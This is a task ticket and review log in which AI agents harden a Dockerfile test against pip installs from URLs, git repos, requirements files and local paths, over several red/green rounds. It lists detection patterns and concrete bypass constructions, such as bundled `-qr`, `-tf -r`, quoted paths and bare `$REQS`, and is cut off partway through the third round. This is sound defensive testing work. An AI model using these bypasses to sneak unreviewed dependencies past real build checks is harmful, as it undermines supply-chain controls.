---
id: T-0046
title: the Dockerfile pip check cannot see a URL that lives in a COPYed requirements file
state: review
owner: agent/builder-9
owner_session: 01SS4jAGs2oyr4Z4Wd8yK82t
claimed_at: 2026-09-07T16:57:36Z
lease_expires_at: 2026-09-07T19:57:36Z
worktree: ../wt/T-0046
branch: task/T-0046
exclusive: []
touches: [services/etl/]
pins_affected: []
reviewer: agent/reviewer-pr29
depends_on: []
verify: [ops/test, ops/check-pins]
acceptance: []
---
## Brief

`services/etl/tests/test_dockerfile.py::test_nothing_is_pip_installed_from_a_url_or_a_repo` reads the
Dockerfile's RUN text and nothing else, so:

    COPY requirements.txt .
    RUN pip install --break-system-packages -r requirements.txt

passes all nine tests while `requirements.txt` pins `git+https://...`. agent/reviewer-22 confirmed it live,
9/9 green, while reviewing T-0038.

Filed as MAJOR and not as a BLOCKER on that task, for a reason worth keeping straight: unlike the three
decorative checks that task did produce, this test does exactly what it says - it catches URL, `git+` and
index literals in RUN text. The gap is a scope boundary, and it is prospective: neither `pip` nor
`COPY requirements.txt` appears in the current Dockerfile.

Fix in the shape the heredoc test already uses - fail CLOSED at the edge of what the parser can see, rather
than pass over something it cannot read:

- `pip install` with an indirect target (`-r <file>`, `-e <path>`, a bare `.`) fails the test with a message
  saying the check cannot see inside that file, so adding one is a conversation rather than a silent hole.
- If a requirements file is ever genuinely needed, the test grows to read it; that is a deliberate edit.
- Demonstrate red with exactly reviewer-22's construction (`COPY requirements.txt` + `RUN pip install -r`),
  then green.

Also recorded from that review, not requiring action: `pip install -f <url>` is already caught (a working URL
contains `https?://`), and a schemeless `-f10.0.0.5:8080/...` evades the regex on paper but is not a
functioning pip network fetch, since pip will not treat a digit-leading token as a scheme.

## Log
- 2026-09-07T16:57:36Z claimed by agent/builder-9; lease until 2026-09-07T19:57:36Z
- 2026-09-07 agent/builder-9: fixed, full red/green log below.

### RED 1 - reproduce reviewer-22's exact construction (before any code change)

Appended to `services/etl/Dockerfile` (after `WORKDIR /w`):

    COPY requirements.txt .
    RUN pip install --break-system-packages -r requirements.txt

`python -m pytest -v tests/test_dockerfile.py`:

    ============================= test session starts =============================
    collected 9 items
    tests\test_dockerfile.py .........                                       [100%]
    ============================== 9 passed in 0.03s ==============================

Confirmed live: 9/9 green while `requirements.txt` could pin `git+https://...` unseen. Dockerfile restored
byte-for-byte (`git diff --stat Dockerfile` empty) before touching any code.

### Fix

`services/etl/tests/test_dockerfile.py`: added `PIP_INDIRECT_TARGET`, a regex sibling to `PIP_FROM_NETWORK`
that matches the *flag*, not what follows it - the same fail-closed shape `PIP_FROM_NETWORK` already uses for
`--index-url`/`--find-links` (presence alone fails, regardless of the argument):

    PIP_INDIRECT_TARGET = re.compile(
        r"\bpip3?\b[^&|;]*\binstall\b[^&|;]*"
        r"(-r\b|--requirement\b|-e\b|--editable\b|-c\b|--constraint\b|(?<!\S)\.(?!\S))"
    )

and a new test, `test_the_parser_is_not_silently_blind_to_an_indirect_pip_install`, modeled directly on
`test_the_parser_is_not_silently_blind_to_a_heredoc_run` (same file, same class): it names the blind spot,
attributes it to reviewer-22, and fails closed with a message telling whoever adds one that the check cannot
see inside it. Verified the pattern byte-for-byte before committing to it: `pattern.encode("utf-8").count(b"\x08")
== 0` and `cat -A` on the added lines showed plain `$`-terminated lines, no hidden control bytes - written from
a script file (`verify_pip_indirect_regex.py`), not a shell `-c` string, per the lesson in this file's own
docstrings about the backspace-byte regex that could never match.

### RED 2 - same construction, now caught, with the exact message

Re-added the identical two lines to the Dockerfile. `python -m pytest -v tests/test_dockerfile.py`:

    collected 10 items
    tests\test_dockerfile.py ........F.                                      [100%]
    ================================== FAILURES ===================================
    _ TestTheImageIsPinned.test_the_parser_is_not_silently_blind_to_an_indirect_pip_install _
    E       AssertionError: this parser cannot see inside a pip install target it does not read directly
            (-r/--requirement, -e/--editable, -c/--constraint, or a bare '.'):
            ['RUN pip install --break-system-packages -r requirements.txt']
    ========================= 1 failed, 9 passed in 0.10s ==========================

Dockerfile restored again immediately after; `git diff --stat Dockerfile` / `git status --porcelain Dockerfile`
both empty.

### Existing direct cases still go red (unchanged - still `PIP_FROM_NETWORK`, not the new test)

    RED: 'RUN pip install https://example.org/pkg-1.0-py3-none-any.whl' -> matched='pip install https://'
    RED: 'RUN pip install git+https://example.org/org/repo.git'         -> matched='pip install git+https://'
    RED: 'RUN pip install --index-url https://example.org/simple somepkg' -> matched='pip install --index-url https://'

### Shipped Dockerfile still passes, byte-identical

`python -m pytest -v tests/test_dockerfile.py` against the unmodified Dockerfile: `10 passed in 0.03s`.
`git diff --stat services/etl/Dockerfile` -> empty. Only `services/etl/tests/test_dockerfile.py` is changed
(`git status --porcelain` shows a single ` M`).

### Try to get past the fix (item 5) - ran each as a real Dockerfile edit through pytest, not just the regex

    COPY requirements.txt .
    RUN pip install --requirement=req.txt      -> FAILED, offenders=['RUN pip install --requirement=req.txt']
    RUN python -m pip install -r req.txt       -> FAILED, offenders=['RUN python -m pip install -r req.txt']
    RUN pip3 install -e .                      -> FAILED, offenders=['RUN pip3 install -e .']
    RUN pip install .                          -> FAILED, offenders=['RUN pip install .']
    RUN pip install -c constraints.txt         -> FAILED, offenders=['RUN pip install -c constraints.txt']

Nothing slipped. `-c`/`--constraint` was not in the brief's explicit list (`-r`, `-e`, bare `.`, `--requirement`)
but is added anyway: pip constraints files are an external target this parser cannot read either, and the
brief's own principle - fail closed at the edge of what the parser can see - argues for including it rather
than leaving a documented exception. Dockerfile restored after each case; final `git diff --stat Dockerfile`
empty.

### Full suite + repo verification

`cd services/etl && python -m pytest -q tests/`:

    46 passed in 4.64s

`cd services/api && npm ci --no-audit --no-fund` (fresh worktree, T-0040's known gap, not run by `ops/test`
itself): `added 85 packages`.

`bash ops/test`:

    TESTS linux=96/76 ios=skipped failed=0 skipped=0
    OK

`bash ops/check-pins`:

    PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux

`bash ops/queue-check`:

    QUEUE OK (46 tasks)

Handing off to agent/reviewer-29.

- 2026-09-07 agent/reviewer-29: **FAIL.** Re-derived rather than trusted:

  **Re-derived independently (all confirmed):**
  - Committed-blob byte check (not just working tree): `git show HEAD:services/etl/tests/test_dockerfile.py`
    piped to a byte count -> 0 occurrences of `\x08` in 8576 bytes; `cat -A` on lines 30-44 shows plain
    `$`-terminated lines, no control bytes. The fourth-decorative-check hypothesis does not hold for the
    bytes actually on disk.
  - RED: checked out the parent commit's test file (`git show ecf72a3:.../test_dockerfile.py`), ran it as a
    second file against a Dockerfile carrying reviewer-22's exact two lines
    (`COPY requirements.txt .` / `RUN pip install --break-system-packages -r requirements.txt`) -> `9 passed`,
    confirming the pre-fix silent hole live, not on the owner's say-so.
  - GREEN: same construction against HEAD's test file -> `1 failed, 9 passed`, correct test, correct message.
  - Dockerfile restored after every experiment; `git diff --stat` / `git status --short` empty each time,
    confirmed independently at multiple checkpoints, not just at the end.
  - Demonstrated two *existing* tests red myself (item 5), not the two the owner showed:
    `test_the_base_image_is_pinned_by_digest` red after stripping `@sha256:...`, and
    `test_the_package_list_is_not_upgraded_out_from_under_the_pin` red on `apt-get install --only-upgrade
    libc6` (the exact second-spelling bypass the file's own docstring records at
    `services/etl/tests/test_dockerfile.py:97`). Both genuinely fail for the stated reason.
  - Ran `cd services/etl && python -m pytest -q tests/` (46 passed, exit 0, verified via `-rA` since this
    shell swallows the `-q` summary line for this run), `cd services/api && npm ci --no-audit --no-fund`
    (added 85 packages), `bash ops/test` (`TESTS linux=96/76 ios=skipped failed=0 skipped=0` / `OK`),
    `bash ops/check-pins` (`PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux`), `bash
    ops/queue-check` (`QUEUE OK (46 tasks)`) — all match the owner's numbers exactly.

  **New finding — MAJOR — two real bypasses of `PIP_INDIRECT_TARGET`
  (`services/etl/tests/test_dockerfile.py:40-43`, exercised by the new test at :124-141):**

  1. **Bundled short flags.** `RUN pip install -qr requirements.txt` (after a `COPY requirements.txt .`)
     passes all 10 tests — `PIP_INDIRECT_TARGET` looks for the literal two-byte sequence `-r` at a word
     boundary; `-qr` contains no such substring. This is not a theoretical gap: `pip install -qr
     /tmp/nonexistent_req.txt` against the pip actually installed on this box (pip 26.1.1) produced
     "Could not open requirements file", proving pip parses `-qr` as `-q` + `-r <file>` — a completely
     ordinary way to write this in a real Dockerfile (quiet flag bundled with requirements, common in CI
     images to cut log noise). Confirmed twice: raw-regex sweep and, separately, a real edit to
     `services/etl/Dockerfile` run through the actual pytest suite (`10 passed`, should have been `9 passed,
     1 failed`); Dockerfile restored, diff empty after.
  2. **Local directory path without `-e`.** `RUN pip install ./localpkg` (after `COPY localpkg/
     ./localpkg/`) also passes all 10 tests. The docstring at :131-133 explicitly claims coverage of "an
     editable/local path" and the code path assumes that means the `-e` flag or a bare `.`, but pip
     installs a local project directory directly as a positional argument with neither: verified live with
     `pip install --dry-run ./localdir_test` against a real `setup.py`, which processed and reported "Would
     install x-0.0.0" with no `-e` anywhere on the line. `(?<!\S)\.(?!\S)` only matches an isolated `.`
     token, not `./anything`. Confirmed through the full Dockerfile + pytest harness the same way as (1);
     Dockerfile restored, diff empty after.

  Both are exactly the shape this file has a documented history of: a check that reads as fail-closed and
  is not, for constructions ordinary enough to show up by accident, not just adversarially. Given three
  prior decorative checks in this exact file (recorded in its own docstrings at :96-100, :108-111, and the
  heredoc test's history), a partial fix that leaves two of the "at minimum" probe shapes open is a hole of
  the same kind as the one this task exists to close, not a nitpick.

  **Checked and NOT a defect (item 4, false-positive side) — re-derived, not trusted:** `pip install
  requests`, `pip install 'requests==2.31.0'`, `pip download -r x.txt`, `apt-get install -y python3-yaml`,
  `grep -r foo /etc`, `rm -r /tmp/foo`, `cp -r /a /b` — each run individually through the real Dockerfile +
  full pytest suite, all `10 passed`, no false positives.

  **Checked and correctly caught (item 3, other probe shapes) — re-derived, not trusted:**
  `--requirement=req.txt`; `--requirement req.txt` split across a real backslash line continuation (verified
  through the Dockerfile's own continuation-joining, not just a Python string with an embedded `\n`);
  `python -m pip install -r req.txt`; `pip3 install -e .`; `pip install -c constraints.txt`;
  `pip install -e git+https://...`; `/usr/bin/pip3 install -r req.txt`; `pip install` inside a `sh -c "..."`
  string; `pip install -r $REQS` (variable value, `-r` flag literal and present).

  **Noted, not blocking:** `RUN pip install $REQS` with *no* `-r`/`-e`/`-c` flag at all (target is a bare
  shell variable that could resolve to anything, including a `git+` URL or `-r file`, via `ARG`/`ENV`
  elsewhere in the same Dockerfile) slips past both `PIP_FROM_NETWORK` and `PIP_INDIRECT_TARGET`. This is an
  inherent limitation of a RUN-text regex (it equally afflicted `PIP_FROM_NETWORK` before this task, and
  neither this task's brief nor the new docstring claims to cover variable indirection), not a defect
  introduced by this diff — recording it for whoever eventually touches this file next, same spirit as the
  brief's own "recorded from that review, not requiring action" note on `-f10.0.0.5:8080/...`.

  **Verdict:** FAIL. Send back to agent/builder-9: extend `PIP_INDIRECT_TARGET` to catch a bundled short
  flag (e.g. match `-\w*r\b` rather than requiring `-r` as the literal first two characters after the
  boundary, applied consistently to `-e`/`-c` too) and a local-path install without `-e` (e.g. treat any
  bare non-flag token that starts with `./`, `../`, or `/` — or more simply, any pip `install` argument that
  is not a flag and is not a bare package-name-shaped token — as indirect, alongside the existing bare-`.`
  case). Left in `queue/review/`.

- 2026-09-07 agent/builder-9: addressed reviewer-29's FAIL. Both bypasses were real; `PIP_INDIRECT_TARGET`
  was a text-substring regex, which cannot express "a flag whose letters may be bundled with other letters
  in either order" or "a positional argument that is not a flag." Rewrote the check as two small functions
  instead of widening the regex further, and rewrote the docstring to describe what the code actually does
  rather than what it was meant to do.

  **What changed** (`services/etl/tests/test_dockerfile.py`):
  - `pip_install_arglists(run_line)` - locates every `pip`/`pip3` `install` invocation in a RUN line
    (matches `pip3? ... install`, so `python -m pip install`, `/usr/bin/pip3 install`, and `pip install`
    inside `sh -c "..."` all match, same as before) and returns its argument tokens, split at the same
    `&&`/`|`/`;` boundaries the rest of the file already uses as command separators.
  - `pip_indirect_targets(args)` - walks that token list. A token is an offender if: (a) it is
    `-r`/`-c`/`-e`, long (`--requirement`, `--editable`, `--constraint`, `=`-form or space-form) or short,
    **including short flags bundled with other short flags in either order** (`-qr`, `-rq`, `-Uqr`, ...) -
    confirmed against a real pip that `-qr` really does parse as `-q` then `-r`, not a no-op:
    `pip install -qr /tmp/nonexistent_req.txt` -> "Could not open requirements file"; or (b) it is a bare
    positional argument - not preceded by a flag, not itself a flag - that names a local path: `.`, `..`,
    or anything starting `./`, `../`, or `/`. Flag values that are themselves not install sources
    (`--target DIR`, `--index-url URL`, `--cache-dir DIR`, ~25 others enumerated in
    `PIP_VALUE_FLAGS_LONG`, plus the short forms `-t`/`-i`/`-b`/`-f`) are skipped before this
    classification runs, specifically so a destination directory is never mistaken for a source - a plain
    `pip install --target /opt/vendor requests==2.31.0` was not in the reviewer's probe list but would have
    been a new false positive if I had not tracked which flags consume the next token.
  - `pip_indirect_target_offenders()` - `(RUN line, offending tokens)` pairs across every RUN, used by the
    test.
  - Rewrote the test's docstring: it now names the exact prior gap (regex matched `-r` as the literal first
    two characters after a boundary, and only an isolated `.` token - not `-qr` or `./localpkg`), says the
    check tokenizes and walks the argument list rather than pattern-matching raw text, and states the
    `$VAR`-with-no-flag gap explicitly as known and deliberately out of scope (decision below) instead of
    implying coverage it does not have - the exact defect class reviewer-29 called out.

  **Decision on the non-blocking item — a bare `pip install $REQS` with no `-r`/`-e`/`-c` flag at all:**
  left uncaught, deliberately, not fixed. Reasoning: (1) the coordinator's brief for this round explicitly
  said not to close it by widening the regex further; (2) resolving what a Dockerfile `ARG`/`ENV`
  substitution might contain is a fundamentally different, much larger parser than "read the RUN text" -
  it is the same class of problem as the heredoc gap two tests down, not a small extension of this one;
  (3) the narrower, tempting fix - flag *any* token containing `$` as suspect - would false-positive on
  ordinary, harmless patterns this file must stay green on, e.g. `pip install "requests==${PIN}"` pinning a
  version via a build `ARG`, which is not an indirect *target* at all. Recorded here, in the test's own
  docstring, and left for whoever next needs to teach this parser about build-time substitution -
  same spirit as the heredoc test's own scope boundary.

  **RED before fix, both bypasses, real Dockerfile + pytest harness** (test file pinned to the commit
  reviewer-29 reviewed, `2ce083d`, via `git show 2ce083d:services/etl/tests/test_dockerfile.py`, swapped
  into `tests/test_dockerfile.py`, run against the Dockerfile with `COPY requirements.txt .` and the
  bypass line appended):

      RUN pip install -qr requirements.txt        -> ..........  [100%]   10 passed  (should have failed)
      RUN pip install ./localpkg                   -> ..........  [100%]   10 passed  (should have failed)

  Confirms reviewer-29's exact finding, independently reproduced, not trusted.

  **GREEN after fix, same two constructions, same harness** (live, fixed test file restored):

      RUN pip install -qr requirements.txt
      E   AssertionError: this parser cannot read the contents of a pip install target named this way -
          -r/--requirement, -e/--editable, -c/--constraint (long, short, or bundled with other short
          flags), or a bare local path ('.', '..', './x', '../x', '/x'):
          [('RUN pip install -qr requirements.txt', ['-qr'])]
      1 failed, 9 deselected

      RUN pip install ./localpkg
      E   AssertionError: ... [('RUN pip install ./localpkg', ['./localpkg'])]
      1 failed, 9 deselected

  Dockerfile restored after each run; `git diff --stat Dockerfile` / `git status --porcelain Dockerfile`
  empty at every checkpoint.

  **Reviewer's full probe list, re-run through the real Dockerfile + pytest harness (not the regex in
  isolation):**

  Must stay green (all `10 passed`): `pip install requests`, `pip install 'requests==2.31.0'`,
  `pip download -r x.txt`, `apt-get install -y python3-yaml`, `grep -r foo /etc`, `rm -r /tmp/foo`,
  `cp -r /a /b` - confirmed, none fire.

  Must go red (all `1 failed` on the new test, with the offending token named): `--requirement=req.txt`,
  `--requirement req.txt`, `python -m pip install -r req.txt`, `pip3 install -e .`, `pip install -c
  constraints.txt`, `pip install -e git+https://...` (fails *two* tests - this one and the pre-existing
  `test_nothing_is_pip_installed_from_a_url_or_a_repo`, correctly, since it is both), `/usr/bin/pip3 install
  -r req.txt`, `pip install` inside `sh -c "..."`, `pip install -r $REQS` (flag literal is present, so this
  one *is* caught even though the bare-variable-no-flag case is not), `pip install -rq requirements.txt`
  (bundle in the other order), `pip install ../sibling_pkg`, `pip install /abs/path/pkg`,
  `pip install --editable ./localpkg` - confirmed, all fire with the new message.

  Additional false-positive check beyond the reviewer's list, specifically for the flag/value-skipping
  logic added to fix bypass 1 without breaking legitimate Dockerfiles: `pip install --target /opt/vendor
  requests==2.31.0` and `pip install -t /opt/vendor requests` both stay green (`10 passed`) - `--target`/
  `-t` name a destination directory, not a source, and are now correctly skipped rather than misread as a
  local-path install target.

  **Committed-blob byte check** (after commit, before push): `git show HEAD:services/etl/tests/
  test_dockerfile.py | python -c "import sys; d=sys.stdin.buffer.read(); print(len(d), d.count(b'\x08'))"`
  -> `14103 0` - 14103 bytes, zero `\x08` occurrences, on the blob actually in the commit, not the working
  tree. `cat -A` on the same blob shows plain `$`-terminated lines through the new constants and functions,
  no control-character artifacts. `git show HEAD:...` also confirms `pip_indirect_target_offenders` is
  wired into the test (line 233) and the old `PIP_INDIRECT_TARGET` regex name no longer appears anywhere in
  the committed blob.

  **Full verification, unchanged from the first pass:**

      cd services/etl && python -m pytest -q tests/        -> 46 passed
      bash ops/test                                          -> TESTS linux=96/76 ios=skipped failed=0 skipped=0 / OK
      bash ops/check-pins                                    -> PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux
      bash ops/queue-check                                   -> QUEUE OK (46 tasks)

  Only `services/etl/tests/test_dockerfile.py` is touched; `git diff --stat services/etl/Dockerfile` is
  empty. `git status --porcelain` shows a single ` M`. Handing back to agent/reviewer-29.

- 2026-09-07 agent/reviewer-29: **FAIL, second round.** Both of my original bypasses are genuinely closed
  (re-derived, not trusted - see below). Found two new ones while attacking the tokenizer per the
  coordinator's round-two brief; one of them is worse than either original finding, because it hides a
  completely ordinary, unmodified `-r requirements.txt` behind a legitimate, single-purpose flag.

  **Re-derived rather than trusted:**
  - Committed blob (`git show HEAD:services/etl/tests/test_dockerfile.py`, not the working tree): 14103
    bytes, `0` occurrences of `\x08`, matching the owner's number exactly. `cat -A` on
    `pip_install_arglists`/`pip_indirect_targets` (:62-110) shows plain `$`-terminated lines, no control
    bytes. `PIP_INDIRECT_TARGET` no longer appears anywhere in the blob - the old name is actually gone,
    not just shadowed.
  - Reproduced both original bypasses closing: swapped `2ce083d`'s test file back in, ran it against
    `COPY requirements.txt .` + `RUN pip install -qr requirements.txt` -> `10 passed` (silent, the original
    hole, live); ran HEAD's test file against the same construction -> `1 failed`, correct token named
    (`['-qr']`). Same pattern for `RUN pip install ./localpkg` (`COPY localpkg/ ./localpkg/` first) -> `10
    passed` on the old test, `1 failed` naming `['./localpkg']` on HEAD's. Both genuinely fixed.
  - Full verification suite reproduced with the shipped Dockerfile untouched: `cd services/etl && python -m
    pytest -q tests/` -> 46 passed (`-rA`: 46 `PASSED`, 0 `FAILED`, exit 0); `bash ops/test` ->
    `TESTS linux=96/76 ios=skipped failed=0 skipped=0` / `OK`; `bash ops/check-pins` ->
    `PINS ok=10 skipped=0 pending=3 expired=0 failed=0 tier=linux`; `bash ops/queue-check` ->
    `QUEUE OK (46 tasks)`. `git diff --stat` / `git status --short` empty throughout and at the end.

  **New finding — MAJOR — `skip_next` models short-flag bundling backwards
  (`services/etl/tests/test_dockerfile.py:106`):**

  `skip_next = bool(letters) and letters[-1] in PIP_SHORT_VALUE_LETTERS` assumes a value-taking letter only
  ever draws its value from the *next token*, and only checks whether the *last* letter of the bundle is
  one. Real short-option bundling (confirmed against the pip actually installed on this box, pip 26.1.1)
  works the other way: the *first* value-taking letter encountered in a bundle consumes the *rest of that
  same token* as its value and stops - a later token is a fresh, independent argument. Proven directly:

      $ python3 -m pip install --dry-run -tf -r /tmp/nonexistent_requirements_xyz.txt
      ERROR: Could not open requirements file: [Errno 2] No such file or directory: '.../nonexistent_requirements_xyz.txt'

  `-tf` resolved to `--target f` entirely on its own; `-r` then fired as a completely separate, ordinary
  flag and read the file. `RUN pip install -tf -r requirements.txt` (after `COPY requirements.txt .`) is
  therefore a fully real, working indirect pip install - and it passes all 10 tests. Confirmed through the
  actual harness, not just the tokenizer in isolation:

      tail -3 Dockerfile:  COPY requirements.txt .
                            RUN pip install -tf -r requirements.txt
      python -m pytest -q tests/test_dockerfile.py -rA  -> 10 passed, 0 failed (should be 9/1)

  Root cause: when the tokenizer processes `-tf`, neither letter is in `PIP_SHORT_UNREADABLE_LETTERS`
  (`{r,c,e}`), so the token itself is never flagged - correct so far - but `skip_next` is still set `True`
  because the *last* letter `f` is a value letter, so the very next token (the real `-r`) is silently
  skipped and never examined at all. Any bundle of two letters from `{t,i,b,f}` (12 ordered pairs, e.g.
  `-it`, `-bi`, `-fb`, ...) immediately followed by a genuine `-r`/`-e`/`-c`/local-path argument reproduces
  this; also confirmed `-it -r req.txt` slips (`offenders=[]`) via the raw tokenizer. Where the swallowed
  token would itself independently trigger detection through a later argument (e.g. `-bi -e ./pkg` - `-e`
  is skipped, but `./pkg` two tokens later still starts with `./` and gets caught anyway) the bug is
  invisible; it is only fatal, as here, when the argument right after the bundle is a bare filename with no
  distinguishing prefix (`requirements.txt`, not `./requirements.txt`) - which is the normal, unremarkable
  way anyone actually writes `-r requirements.txt`.

  **New finding — MAJOR — the tokenizer does not understand shell quoting
  (`services/etl/tests/test_dockerfile.py:69-72` builds tokens with a bare `.split()`; the bare-path check
  is at `:108`):**

  `RUN pip install "./localpkg"` and `RUN pip install './localpkg'` both pass all 10 tests. Docker's shell
  form runs RUN lines through `/bin/sh -c`, which strips the quotes before pip ever sees the argument -
  `pip install "./localpkg"` and `pip install ./localpkg` are the same install at build time. But
  `.split()` treats the leading quote character as part of the token (`'"./localpkg"'`), so
  `tok.startswith(("./", "../", "/"))` at :108 never matches. Confirmed through the full harness (`COPY
  localpkg/ ./localpkg/` + `RUN pip install "./localpkg"` -> `10 passed`, should be `9/1`). A quoted path
  containing a space compounds this: `pip install "./local pkg"` (one real, quoted argument at build time)
  is torn by `.split()` into two fake tokens (`'"./local'`, `"pkg\"'`) and slips for two independent
  reasons at once. By contrast, a *backslash-escaped* space (`./local\ pkg`, no quotes) happens to still be
  caught - the first fake token keeps its literal `./` prefix - so this is specifically a quoting gap, not
  a general space-in-path gap.

  **Noted, low severity, not blocking:** a Windows-style path (`pip install .\localpkg`) is not recognized
  as a local path either, but the base image is `ubuntu:24.04` (`FROM` line, `services/etl/Dockerfile:13`)
  - backslash is not a path separator to `/bin/sh` or to pip on Linux, so this specific construction is not
  a functioning install on *this* Dockerfile, only a theoretical parser gap. Recording it, not counting it
  toward the verdict.

  **Re-confirmed clean (item 3, false-positive side, full list including the two new probes) - re-derived,
  not trusted:** `pip install requests`, `pip install 'requests==2.31.0'`, `pip download -r x.txt`,
  `apt-get install -y python3-yaml`, `grep -r foo /etc`, `rm -r /tmp/foo`, `cp -r /a /b`,
  `pip install --target /opt/vendor requests==2.31.0`, `pip install --prefix /usr/local requests`,
  `pip install --upgrade requests`, `pip install -qt /opt` - none flagged, matches the design intent, no
  false positives from the widened flag-value tracking.

  **Re-confirmed clean (other item-2 probes) - re-derived, not trusted:** quoted `-r "my reqs.txt"` / `-r
  'my reqs.txt'` (still caught - the `-r` flag itself is a separate token regardless of what follows it in
  quotes); `--` as an end-of-options marker before a bare path (still caught, `--` itself is inert to this
  tokenizer and does not suppress the path check after it); `--requirement=x` and `--requirement x`; a
  flag bundle ending in a destination flag (`-qt /opt`, correctly *not* flagged, matching the design
  intent); `pip install --upgrade requests` (correctly not flagged); `pip install -U -r req.txt` (caught);
  two `pip install` calls chained with `&&` where only the second is indirect (caught, second segment
  flagged); `pip install` inside `sh -c "..."` (caught, `-r` still a distinct token inside the string).

  **Verdict:** FAIL. Send back to agent/builder-9. Two fixes needed: (1) `skip_next` must track *whether a
  value-taking letter has already fired within this same token* and stop scanning/skip based on the first
  such letter, not `letters[-1]` - modeling real short-option bundling requires walking the bundle
  left-to-right and stopping at the first value-consuming letter, not inspecting only the last character;
  (2) either strip matching leading/trailing quote characters (and split on shell-aware boundaries, or at
  minimum strip a leading `"`/`'` before the `./`/`../`/`/` prefix check) or document unquoted-only
  coverage explicitly and accept the narrower claim - given this file's history, the docstring must say
  exactly which one was chosen. Left in `queue/review/`.

- 2026-09-07 agent/builder-9: **round 3 - stopped trying to model pip's grammar and failed closed
  instead**, per the coordinator's steer and reviewer-29's own framing. Did not attempt to fix bundling by
  getting the first-vs-last letter right; instead removed the assumption that any bundle can be resolved
  at all.

  **Why not another round of "fix the specific shape":** two rounds, two new genuine bypasses, both real
  insights about a grammar this file does not own and that pip itself has changed across versions
  (`-C`/`--config-settings` did not always exist; flag sets differ between pip releases). That is the exact
  signature CLAUDE.md's premise section names - "agents report success on broken work" - applied to a test
  file, not application code: each fix *was* correct for the shapes it was shown, and still left a new one,
  because the actual failure mode was never "wrong regex," it was "modeling a moving target." The file
  already has two working examples of the honest alternative -
  `test_the_parser_is_not_silently_blind_to_a_heredoc_run` and this test's own prior "fail closed on the
  flag, not on what it points to" framing - so this round extends that same idea one level further: fail
  closed on the *shape of the invocation*, not just on the flags this check happens to recognize.

  **What changed** (`services/etl/tests/test_dockerfile.py`):
  - `pip_indirect_targets(args)` is now a whitelist, not a blacklist. A token is safe only if positively
    recognized as one of: a small curated list of long boolean flags (`PIP_BOOLEAN_FLAGS_LONG` - `--user`,
    `--upgrade`, `--no-cache-dir`, `--break-system-packages`, ~20 others, all stable/unambiguous), a small
    curated list of long/short destination-value flags (`PIP_DESTINATION_VALUE_FLAGS_LONG` /
    `PIP_DESTINATION_VALUE_LETTERS` - unchanged in spirit from round 2, `--target`/`-t`, `--prefix`,
    `--index-url`, etc.), or a bare word that is not a flag, not quoted, not a `$` substitution, and does
    not look like a local path. Everything else - including a flag this check has simply never heard of -
    is now itself the failure, with a reason string naming why.
  - **Bundling is no longer modeled at all.** Any short-flag token with more than one letter after the `-`
    (`-tf`, `-qr`, `-qt`, anything) fails closed unconditionally, regardless of which letters are in it.
    This closes reviewer-29's `-tf -r requirements.txt` finding directly - `-tf` fails on its own, before
    the parser ever has to reason about what it does to the following `-r` - and it also closes the whole
    *class* (any two-letter-or-more bundle) rather than the one construction demonstrated. Only single,
    unbundled short letters are still individually classified.
  - **Quoting**: added `_dequote(tok)`, which strips one matched pair of leading/trailing shell quotes
    (Docker's shell form does exactly this before pip ever sees the argument) and reports `resolvable=False`
    - itself now a failure - when a quote character is present but does not form a clean matched pair
    around the whole token (almost always meaning the true argument had an internal space and was torn into
    several fake tokens by this file's plain `.split()`, which this check will not try to reassemble).
    Closes both `"./localpkg"` and `'./localpkg'` directly, and closes the broader class of "any quoting
    this tokenizer cannot cleanly undo," not just the two demonstrated forms.
  - **`$` substitution**: any token containing `$` now fails closed, reversing round 2's decision to leave
    `pip install $REQS` (no flag at all) open. Reasoning for the reversal, since the log is supposed to
    carry it either way: a bare variable in target position is indistinguishable from `-r $REQS` with the
    flag stripped by a careless edit, and the false-positive concern that justified leaving it open -
    `pip install "requests==${PIN}"`, an ARG-substituted version pin - genuinely does now fail too, and
    that is accepted as the cost of the strategy, not an oversight: `--target $DIR` / `--prefix $DIR` (a
    `$` inside a value already skipped as a known destination, never even inspected) still pass, so the
    strictness lands on install *sources*, specifically, not on every dollar sign in the invocation.
  - Rewrote both docstrings (`pip_indirect_targets` and the test) to describe the whitelist model, name
    round 1 and round 2's specific failures and why each was a grammar-modeling problem rather than a typo,
    and state plainly that this file no longer tries to keep up with pip's CLI surface.

  **Deliberate behavior change, not required by either round's probe list, worth recording anyway:**
  `pip install -qt /opt` - confirmed clean by reviewer-29 in round 2 under the old (bundling-modeled)
  design - now fails closed too, since it is a bundle, full stop. This is intentional: the whole point of
  refusing to parse bundles is that this check no longer tries to tell a harmless one from a dangerous one.

  **RED before fix, all three round-3 findings, real Dockerfile + pytest harness** (test file pinned to
  `91e7d7f`, the commit reviewer-29's round-2 review left the task in, swapped into
  `tests/test_dockerfile.py`, run against the Dockerfile with the relevant `COPY` and the bypass line
  appended):

      RUN pip install -tf -r requirements.txt   (after COPY requirements.txt .)        -> 10 passed
      RUN pip install "./localpkg"              (after COPY localpkg/ ./localpkg/)     -> 10 passed
      RUN pip install './localpkg'              (after COPY localpkg/ ./localpkg/)     -> 10 passed

  All three reproduce reviewer-29's round-2 findings live, independently, not on their say-so.

  **GREEN after fix, same three constructions, same harness** (live, round-3 test file restored):

      RUN pip install -tf -r requirements.txt
      -> 1 failed: [('-tf', 'a bundled short flag - bundling order is not modeled'),
                    ('-r', 'an unreadable target flag')]

      RUN pip install "./localpkg"
      -> 1 failed: [('"./localpkg"', 'a local path')]

      RUN pip install './localpkg'
      -> 1 failed: [("'./localpkg'", 'a local path')]

  Dockerfile restored after each run; `git diff --stat Dockerfile` / `git status --porcelain Dockerfile`
  empty at every checkpoint.

  **Full false-positive list re-run through the real Dockerfile + pytest harness, including the two new
  required probes:**

  Stay green (`10 passed`): `pip install requests`, `pip install 'requests==2.31.0'`,
  `pip download -r x.txt`, `apt-get install -y python3-yaml`, `grep -r foo /etc`, `rm -r /tmp/foo`,
  `cp -r /a /b`, `pip install --target /opt/vendor requests==2.31.0`,
  **`pip install --prefix /usr/local requests`** (the probe reviewer-29 named explicitly),
  `pip install -t /opt/vendor requests`, `pip install --no-color requests`,
  `pip install --upgrade requests` - confirmed, none fire.

  Go red (`1 failed` on the new test): `pip install -qr requirements.txt`, `pip install ./localpkg`
  (round-1 bypasses, still caught), `pip install -tf -r requirements.txt`,
  `pip install "./localpkg"`, `pip install './localpkg'` (round-2 bypasses, now caught),
  `pip install $REQS` (reversed decision - now caught), `pip install -r $REQS`,
